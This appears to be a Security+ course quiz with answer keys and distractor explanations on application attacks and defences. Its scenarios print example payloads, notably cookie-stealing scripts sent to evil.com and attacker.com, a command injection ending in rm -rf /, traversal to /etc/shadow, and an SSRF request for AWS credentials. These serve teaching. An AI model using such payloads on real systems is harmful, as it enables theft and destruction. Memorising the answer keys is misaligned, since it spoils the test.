# Quiz: Module 03 - Application Attacks and Software Vulnerabilities
## Course: CIS-4328_Information_Security (CompTIA Security+ SY0-701)

---

**Question 1**
An organization wants to deploy a new public-facing customer portal. The portal must communicate with a highly secure backend database that stores PII. Which network architectural design provides the most secure placement for these servers?
A) Place both the web server and the database server in the DMZ to ensure fast communication.
B) Place the web server in the DMZ and the database server on the internal secure network.
C) Place both servers on the internal secure network and forward port 80/443 directly from the internet router.
D) Place the database server in the DMZ and the web server on the internal network.
*   **Correct Answer:** B) Place the web server in the DMZ and the database server on the internal secure network.
*   **Distractor Analysis:**
    *   *Why A is incorrect:* Placing the database in the DMZ exposes PII to a semi-trusted zone directly reachable from the internet, violating defense-in-depth. A compromised web server could directly attack the database without any additional firewall barrier.
    *   *Why C is incorrect:* Port forwarding directly to the internal network bypasses the DMZ entirely, exposing the most sensitive zone to direct internet attacks with no intermediate filtering layer.
    *   *Why D is incorrect:* The web server must be internet-facing (DMZ) while the database must be hidden behind the internal firewall. Reversing their placement makes the web server unreachable and exposes the database to internet traffic.

---

---

**Question 2**
Alice wants to send a highly confidential contract to Bob over an untrusted network. She wants to ensure that *only* Bob can read the contract. Using asymmetric cryptography, whose key should Alice use to encrypt the document?
A) Alice's Private Key
B) Alice's Public Key
C) Bob's Private Key
D) Bob's Public Key
*   **Correct Answer:** D) Bob's Public Key
*   **Distractor Analysis:**
    *   *Why A is incorrect:* Encrypting with Alice's private key creates a digital signature — anyone holding Alice's public key (which is publicly available) can decrypt it, providing no confidentiality.
    *   *Why B is incorrect:* A sender does not encrypt with their own public key. Public keys are used by others to encrypt messages intended for the key owner.
    *   *Why C is incorrect:* Alice does not have access to Bob's private key, and private keys must never be shared. Only Bob's private key can decrypt something encrypted with Bob's public key.

---

---

**Question 3**
A web application accepts a username input field. An attacker enters the string `' OR '1'='1` as the username and gains access to the application without knowing any valid credentials. Which type of attack is this?
A) Cross-Site Scripting (XSS)
B) Buffer Overflow
C) SQL Injection
D) Cross-Site Request Forgery (CSRF)
*   **Correct Answer:** C) SQL Injection
*   **Distractor Analysis:**
    *   *Why A is incorrect:* XSS injects JavaScript that executes in another user's browser — it does not manipulate database queries or bypass authentication at the server side.
    *   *Why B is incorrect:* A buffer overflow writes beyond the bounds of a memory buffer to corrupt program execution — it is a memory-level attack unrelated to SQL query manipulation.
    *   *Why D is incorrect:* CSRF tricks an authenticated user's browser into sending an unintended request — it requires the victim to already be authenticated and does not involve injecting SQL into input fields.

---

**Question 4**
A developer is building a web application and wants to prevent attackers from injecting malicious database commands through form input fields. Which of the following is the MOST effective defense against SQL injection?
A) Enforce HTTPS with TLS 1.3 on all web server connections.
B) Use parameterized queries (prepared statements) for all database interactions.
C) Implement a Web Application Firewall (WAF) as the sole defense layer.
D) Hash all user input with SHA-256 before passing it to the database.
*   **Correct Answer:** B) Use parameterized queries (prepared statements) for all database interactions.
*   **Distractor Analysis:**
    *   *Why A is incorrect:* HTTPS encrypts data in transit between the client and server but does not affect how the server processes input data — a SQLi payload delivered over HTTPS is just as dangerous as one over HTTP.
    *   *Why C is incorrect:* A WAF can detect and block known SQLi patterns but can be bypassed with obfuscated payloads — it is a useful compensating control but not a substitute for secure coding practices at the application layer.
    *   *Why D is incorrect:* Hashing input would corrupt legitimate data before it reaches the database and would not prevent injection — the SQL statement structure would still be manipulated before hashing could have any effect.

---

**Question 5**
A security engineer is hardening a web application against cross-site scripting (XSS) attacks. Which combination of controls provides the strongest defense?
A) Enable full disk encryption and enforce strong password policies for all database accounts.
B) Implement output encoding for all user-supplied content and deploy a Content Security Policy (CSP) header.
C) Require multi-factor authentication for all user logins and enforce session timeouts.
D) Deploy an IDS to monitor network traffic for XSS signatures and alert the SOC team.
*   **Correct Answer:** B) Implement output encoding for all user-supplied content and deploy a Content Security Policy (CSP) header.
*   **Distractor Analysis:**
    *   *Why A is incorrect:* Full disk encryption and password policies protect data at rest and account access respectively — neither prevents an attacker from injecting JavaScript into web pages served to other users.
    *   *Why C is incorrect:* MFA and session timeouts are authentication and session management controls — they do not prevent script injection into the application's HTML output, which is the mechanism XSS exploits.
    *   *Why D is incorrect:* Network IDS can detect some XSS signatures in unencrypted traffic, but HTTPS prevents deep packet inspection. Detection-only controls do not prevent the attack; output encoding and CSP stop the attack at the source.

---

### Question 6

A penetration tester navigates to the following URL on a web application: `https://store.example.com/invoice?file=../../../etc/passwd`. The server returns the contents of the system password file. Which vulnerability is being exploited?

* A) SQL Injection
* B) Server-Side Request Forgery (SSRF)
* C) Directory Traversal
* D) XML External Entity (XXE) Injection
* **Correct Answer:** C) Directory Traversal
* **Distractor Analysis:**
  * *Why A is incorrect:* SQL injection manipulates database query syntax through input fields — it does not involve file path manipulation or the use of `../` sequences to navigate the server filesystem.
  * *Why B is incorrect:* SSRF causes the server to issue HTTP requests to arbitrary destinations on the attacker's behalf — it involves server-to-server communication, not local file retrieval via path traversal sequences.
  * *Why D is incorrect:* XXE injection exploits XML parsers by defining malicious external entities in XML payloads — while it can also lead to file disclosure, the attack vector shown here is a URL parameter with `../` sequences, which is the hallmark of directory traversal, not XML processing.

---

### Question 7

An attacker finds that changing the URL parameter from `?account_id=1042` to `?account_id=1043` returns a different user's account information. No error or authorization challenge is returned. Which vulnerability does this describe?

* A) SQL Injection
* B) Insecure Direct Object Reference (IDOR)
* C) Cross-Site Request Forgery (CSRF)
* D) Broken Authentication
* **Correct Answer:** B) Insecure Direct Object Reference (IDOR)
* **Distractor Analysis:**
  * *Why A is incorrect:* SQL injection involves inserting SQL syntax into query parameters to manipulate database commands — simply incrementing a numeric ID value does not inject SQL and does not alter query structure.
  * *Why C is incorrect:* CSRF tricks an authenticated user's browser into making an unintended request from a third-party origin — it does not involve directly modifying URL parameters to enumerate objects.
  * *Why D is incorrect:* Broken authentication refers to flaws in login mechanisms such as weak passwords or missing account lockout — the scenario describes accessing records that require only a valid session, not a bypass of the login process.

---

### Question 8

A developer is analyzing why the organization's production web server was exploited even though the same code passed SAST scanning before deployment. The attacker used a valid session cookie to perform unauthorized actions. Which limitation of SAST best explains why the scan did not detect this vulnerability?

* A) SAST tools cannot analyze source code written in interpreted languages such as Python or JavaScript.
* B) SAST analyzes static code and cannot detect runtime authorization logic flaws that depend on session state.
* C) SAST requires the application to be running against a live database to analyze query behavior.
* D) SAST only detects vulnerabilities listed in the OWASP Top 10 and does not cover session management.
* **Correct Answer:** B) SAST analyzes static code and cannot detect runtime authorization logic flaws that depend on session state.
* **Distractor Analysis:**
  * *Why A is incorrect:* SAST tools support a wide range of languages including Python, JavaScript, Java, and C/C++ — language type is not the limitation described in this scenario.
  * *Why C is incorrect:* This describes DAST behavior, not SAST. SAST analyzes source code without requiring a running application or live database connections.
  * *Why D is incorrect:* SAST tools are not limited to OWASP Top 10 — they can detect many vulnerability patterns. The fundamental limitation here is that static analysis cannot execute the code to observe how session-based authorization decisions behave at runtime.

---

### Question 9

An application stores user-submitted comments in a database and renders them without encoding on the forum page. An attacker submits a comment containing `<script>document.location='https://evil.com?c='+document.cookie</script>`. Every user who loads the forum page is redirected and their session cookie is exfiltrated. Which XSS type is this, and why is it more severe than reflected XSS?

* A) DOM-based XSS — because the attack manipulates the browser's Document Object Model without server involvement.
* B) Reflected XSS — because the script is returned immediately in the HTTP response without being stored.
* C) Stored (Persistent) XSS — because the malicious script is saved in the database and executes for every user who visits the page without requiring them to click a link.
* D) Blind XSS — because the attacker cannot see the output of the injected script in their own browser.
* **Correct Answer:** C) Stored (Persistent) XSS — because the malicious script is saved in the database and executes for every user who visits the page without requiring them to click a link.
* **Distractor Analysis:**
  * *Why A is incorrect:* DOM-based XSS occurs entirely in the browser's JavaScript engine by manipulating the DOM — the script in this scenario is retrieved from the server-side database, making it stored XSS.
  * *Why B is incorrect:* Reflected XSS is delivered in a single HTTP response to the attacker's crafted request and is not persisted — the attacker must distribute a link for each victim to click. The scenario describes data stored in the database, which makes it stored XSS.
  * *Why D is incorrect:* Blind XSS is a sub-category of stored XSS where the injected script executes in a context the attacker cannot directly observe (such as an admin dashboard) — while this could also be blind XSS if the attacker cannot see it execute, the more precise and primary classification from the given description is stored XSS, and option C is the most complete and correct answer.

---

### Question 10

A web application uses a server-side function that accepts a URL from user input and fetches content from that URL to display on the page. An attacker supplies the value `http://169.254.169.254/latest/meta-data/iam/security-credentials/` and receives valid AWS IAM credentials. Which vulnerability is this?

* A) Cross-Site Request Forgery (CSRF)
* B) XML External Entity (XXE) Injection
* C) Server-Side Request Forgery (SSRF)
* D) Open Redirect
* **Correct Answer:** C) Server-Side Request Forgery (SSRF)
* **Distractor Analysis:**
  * *Why A is incorrect:* CSRF forces an authenticated victim's browser to make an unintended request — it is a client-side attack. The scenario shows a server-side application making an HTTP request on behalf of the attacker to an internal AWS metadata endpoint.
  * *Why B is incorrect:* XXE injection targets XML parsers by injecting external entity declarations in XML payloads — the attack vector here is a URL parameter that causes server-side HTTP fetch behavior, not XML processing.
  * *Why D is incorrect:* An open redirect sends a user's browser to an attacker-controlled URL using a trusted redirect — it is a client-side redirect, not a server-side fetch to internal infrastructure.

---

### Question 11

An application accepts a search term and constructs a shell command: `find /data -name "[user input]"`. An attacker enters `"; rm -rf /; echo "` and the server deletes its own file system. Which attack type is this?

* A) SQL Injection
* B) Command Injection
* C) LDAP Injection
* D) Buffer Overflow
* **Correct Answer:** B) Command Injection
* **Distractor Analysis:**
  * *Why A is incorrect:* SQL injection targets database query syntax — it does not involve operating system shell commands. The payload here terminates and escapes a shell command, not a SQL statement.
  * *Why C is incorrect:* LDAP injection targets directory service query syntax — the attack vector here is an OS shell command constructed from user input, not an LDAP query.
  * *Why D is incorrect:* Buffer overflow exploits memory boundaries by writing beyond buffer limits — it is a memory-corruption technique unrelated to injecting shell metacharacters into application-constructed commands.

---

### Question 12

A security researcher analyzing a compiled binary discovers that each function return address is preceded by a random 4-byte value that is verified before the function returns. If the value has changed, the program terminates. Which memory protection mechanism does this describe?

* A) ASLR (Address Space Layout Randomization)
* B) DEP/NX (Data Execution Prevention)
* C) Stack Canary
* D) Heap Integrity Check
* **Correct Answer:** C) Stack Canary
* **Distractor Analysis:**
  * *Why A is incorrect:* ASLR randomizes the base addresses of memory regions (stack, heap, libraries) at load time to prevent address prediction — it does not place guard values on the stack next to return addresses.
  * *Why B is incorrect:* DEP/NX marks memory regions as non-executable to prevent shellcode injection in data areas — it does not monitor the integrity of return addresses by checking a guard value.
  * *Why D is incorrect:* Heap integrity checks protect against heap-based overflows by detecting corruption of heap metadata — the described mechanism specifically sits between local variables and the return address on the stack, which is the definition of a stack canary.

---

### Question 13

A developer adds the `HttpOnly` flag to all session cookies in a web application. Which specific attack does this control directly mitigate?

* A) CSRF attacks that send the session cookie to an attacker-controlled domain
* B) XSS attacks that use JavaScript to read and exfiltrate the session cookie
* C) SQL injection attacks that extract session data directly from the database
* D) Clickjacking attacks that trick users into clicking hidden page elements
* **Correct Answer:** B) XSS attacks that use JavaScript to read and exfiltrate the session cookie
* **Distractor Analysis:**
  * *Why A is incorrect:* The `HttpOnly` flag prevents JavaScript from accessing cookies — it does not prevent CSRF, which exploits the browser's automatic inclusion of cookies in cross-origin requests. The SameSite cookie attribute is the primary CSRF mitigation for cookies.
  * *Why C is incorrect:* SQL injection targets database queries at the application tier — it does not interact with or depend on browser cookie flags. `HttpOnly` is a browser security directive with no effect on server-side query processing.
  * *Why D is incorrect:* Clickjacking is mitigated by the `X-Frame-Options` response header or the `frame-ancestors` directive of the Content Security Policy — the `HttpOnly` flag controls JavaScript cookie access and has no effect on iframe embedding behavior.

---

### Question 14

A web form allows users to post comments that are immediately displayed to other users. A security test submits `<img src=x onerror=alert(1)>` and the alert fires in the tester's own browser only while viewing the page. When other users visit the page, the alert also fires. Which defensive control would be MOST effective at preventing this?

* A) Enforce HTTPS on all connections to encrypt comment data in transit.
* B) Implement a rate limit on comment submissions to prevent bulk injection.
* C) Apply context-aware output encoding to all comment content before rendering it as HTML.
* D) Require users to authenticate with MFA before submitting comments.
* **Correct Answer:** C) Apply context-aware output encoding to all comment content before rendering it as HTML.
* **Distractor Analysis:**
  * *Why A is incorrect:* HTTPS encrypts data in transit but does not change how the server processes or renders stored comment content — a stored XSS payload delivered over HTTPS is equally dangerous.
  * *Why B is incorrect:* Rate limiting reduces the volume of submission attempts but does not prevent a single injection payload from being stored and served to all subsequent visitors — it does not address the root cause of unsanitized output.
  * *Why D is incorrect:* MFA strengthens authentication at login but does not prevent authenticated users from submitting malicious content, and does not prevent the injected script from executing in other users' browsers.

---

### Question 15

An organization's vulnerability scan reports a critical finding: the web application framework version in use has a known RCE (Remote Code Execution) vulnerability with a CVSS score of 9.8. The application cannot be patched immediately due to a scheduled change freeze. Which compensating control BEST reduces risk in the short term?

* A) Enable full-disk encryption on the web server to protect data if the server is compromised.
* B) Deploy a Web Application Firewall (WAF) with a virtual patch rule blocking the known exploit payload pattern.
* C) Require all users to change their passwords immediately to prevent credential-based exploitation.
* D) Increase log retention to 180 days so that any exploitation can be investigated retroactively.
* **Correct Answer:** B) Deploy a Web Application Firewall (WAF) with a virtual patch rule blocking the known exploit payload pattern.
* **Distractor Analysis:**
  * *Why A is incorrect:* Full-disk encryption protects data confidentiality if physical media is stolen — it does not prevent a remote code execution exploit from succeeding over the network. The server decrypts data transparently for any running process.
  * *Why C is incorrect:* The CVSS 9.8 RCE vulnerability allows code execution without valid credentials — a password change does not address the exploitable code path because the attack does not require authentication.
  * *Why D is incorrect:* Increasing log retention improves forensic capability after an incident but does not reduce the probability of exploitation. This is a detective/corrective measure, not a preventive compensating control.

---

### Question 16

A security team discovers that a web application is passing user-supplied file names directly to a back-end process that reads and returns the file contents. An attacker submits the value `../../../../etc/shadow` and receives the server's hashed password file. Which vulnerability class does this represent, and which remediation directly addresses the root cause?

* A) SQL Injection; use parameterized queries to prevent file path manipulation.
* B) SSRF; block outbound HTTP requests from the application server to internal networks.
* C) Directory Traversal; validate and canonicalize file paths server-side and restrict access to an allowed base directory using a chroot jail or equivalent.
* D) Command Injection; escape shell metacharacters before passing user input to OS commands.

* **Correct Answer:** C) Directory Traversal; validate and canonicalize file paths server-side and restrict access to an allowed base directory using a chroot jail or equivalent.
* **Distractor Analysis:**
  * *Why A is incorrect:* SQL injection targets database query construction — it does not involve `../` sequences traversing the file system. Parameterized queries address SQL syntax, not file path resolution.
  * *Why B is incorrect:* SSRF causes the server to make outbound HTTP requests to attacker-specified destinations. The scenario involves local file retrieval via path traversal, not server-to-server HTTP communication.
  * *Why D is incorrect:* Command injection injects OS shell commands through input passed to an execution function. The scenario describes a file read operation that resolves a relative path — there is no shell invocation, so escaping shell metacharacters does not address this vulnerability.

---

### Question 17

A developer is auditing a Python web application and finds the following code: `pickle.loads(request.body)`. A security engineer flags this as a critical vulnerability. What attack does this code enable, and what is the correct remediation?

* A) SQL Injection — replace pickle.loads() with a parameterized database query.
* B) Insecure Deserialization — replace pickle with a data-only format such as JSON, and never deserialize untrusted data using a language-native serialization format.
* C) Buffer Overflow — add bounds checking to the request body length before passing it to pickle.loads().
* D) CSRF — add a CSRF token to the request body before deserialization.

* **Correct Answer:** B) Insecure Deserialization — replace pickle with a data-only format such as JSON, and never deserialize untrusted data using a language-native serialization format.
* **Distractor Analysis:**
  * *Why A is incorrect:* SQL injection involves manipulating database query syntax — pickle.loads() is a deserialization function, not a database operation. Replacing it with a query would not make logical sense in this context and would not address the underlying attack surface.
  * *Why C is incorrect:* Buffer overflows exploit memory boundary violations in compiled languages such as C/C++. Python's memory management prevents classical buffer overflows — the danger of pickle.loads() is that it can execute arbitrary Python bytecode embedded in the serialized payload, not that it writes beyond a memory buffer.
  * *Why D is incorrect:* CSRF protections guard against unintended cross-origin requests to an authenticated endpoint — they do not address the code execution risk present in deserializing untrusted binary data. A CSRF token would not prevent an attacker from crafting a malicious pickle payload.

---

### Question 18

An organization conducts a threat model of its e-commerce checkout flow. The team identifies a scenario where an attacker intercepts and modifies the HTTP POST request during checkout, changing the item price from `$299.99` to `$0.01` before it reaches the server. The server accepts the modified value without validation. Which vulnerability category does this represent?

* A) SQL Injection — the attacker is modifying database values directly.
* B) Insecure Direct Object Reference (IDOR) — the attacker is accessing a price object they do not own.
* C) Mass Assignment — the framework is binding all POST parameters to the data model without a whitelist.
* D) Parameter Tampering — the application trusts client-supplied input for server-side business logic decisions without server-side validation.

* **Correct Answer:** D) Parameter Tampering — the application trusts client-supplied input for server-side business logic decisions without server-side validation.
* **Distractor Analysis:**
  * *Why A is incorrect:* SQL injection manipulates database query structure with injected SQL syntax — modifying the numeric value of a price field in a POST body is not a SQL attack and does not alter the query structure.
  * *Why B is incorrect:* IDOR involves accessing data records belonging to other users by manipulating object identifiers such as account IDs — the scenario involves manipulating a business logic value (price), not gaining unauthorized access to another user's record.
  * *Why C is incorrect:* Mass assignment occurs when a framework automatically binds all request parameters to a model, allowing attackers to set fields the developer did not intend to expose — the scenario describes deliberate modification of a single price field, not bulk binding of model attributes.

---

### Question 19

A penetration tester submits the following payload into a web form's search field: `<script>fetch('https://attacker.com/steal?data='+document.cookie)</script>`. The payload is immediately echoed back in the HTTP response and executes in the tester's browser, but is not stored in the database. Other users who perform a normal search are not affected. Which XSS type is this, and what is the primary difference from stored XSS?

* A) DOM-based XSS — the payload is processed entirely in the browser without being sent to the server.
* B) Reflected XSS — the payload is returned in the immediate server response to the crafted request and is not persisted; only users who click the attacker's crafted link are affected.
* C) Stored XSS — the payload is retrieved from the server each time the page loads.
* D) Blind XSS — the payload executes in an admin interface the attacker cannot directly observe.

* **Correct Answer:** B) Reflected XSS — the payload is returned in the immediate server response to the crafted request and is not persisted; only users who click the attacker's crafted link are affected.
* **Distractor Analysis:**
  * *Why A is incorrect:* DOM-based XSS occurs when client-side JavaScript reads attacker-controlled data from the DOM (such as the URL hash or document.referrer) and writes it unsafely to the page — the server never receives or reflects the payload. The scenario shows the server echoing the input back in its response, making it reflected, not DOM-based.
  * *Why C is incorrect:* Stored XSS persists the malicious payload in the application's data store so that it executes for every user who loads the affected page without any further attacker interaction. The scenario explicitly states the payload is not stored and only the tester is affected.
  * *Why D is incorrect:* Blind XSS is a sub-type of stored XSS where the payload executes in a context the attacker cannot directly see — for example, in an admin dashboard. The tester in this scenario directly observes the script executing in their browser, which is the opposite of blind XSS.

---

### Question 20

A security architect is reviewing an internal API that constructs LDAP queries using user-supplied input: `(&(uid=` + username + `)(userPassword=` + password + `))`. An attacker enters `*))(|(uid=*` as the username. The server returns all user accounts. Which vulnerability is present, and which control directly prevents it?

* A) SQL Injection; use parameterized queries for all LDAP operations.
* B) LDAP Injection; validate and sanitize user input by escaping LDAP special characters, or use a library that constructs LDAP filters safely without string concatenation.
* C) XML External Entity (XXE) Injection; disable external entity processing in the LDAP server configuration.
* D) Command Injection; pass user input through a shell escape function before including it in directory queries.

* **Correct Answer:** B) LDAP Injection; validate and sanitize user input by escaping LDAP special characters, or use a library that constructs LDAP filters safely without string concatenation.
* **Distractor Analysis:**
  * *Why A is incorrect:* SQL injection targets relational database query syntax — LDAP queries use a completely different filter syntax (RFC 4515). Parameterized queries are a database concept and do not apply to LDAP filter construction; LDAP-specific input escaping is required.
  * *Why C is incorrect:* XXE injection exploits XML parser behavior when processing external entity declarations — it is unrelated to LDAP filter construction. The attack shown injects LDAP filter metacharacters, not XML entities.
  * *Why D is incorrect:* Command injection targets OS shell command construction and is mitigated by escaping shell metacharacters. LDAP filter injection uses LDAP-specific metacharacters such as `*`, `(`, `)`, and `\` — shell escaping functions do not sanitize these characters and would not prevent the attack.
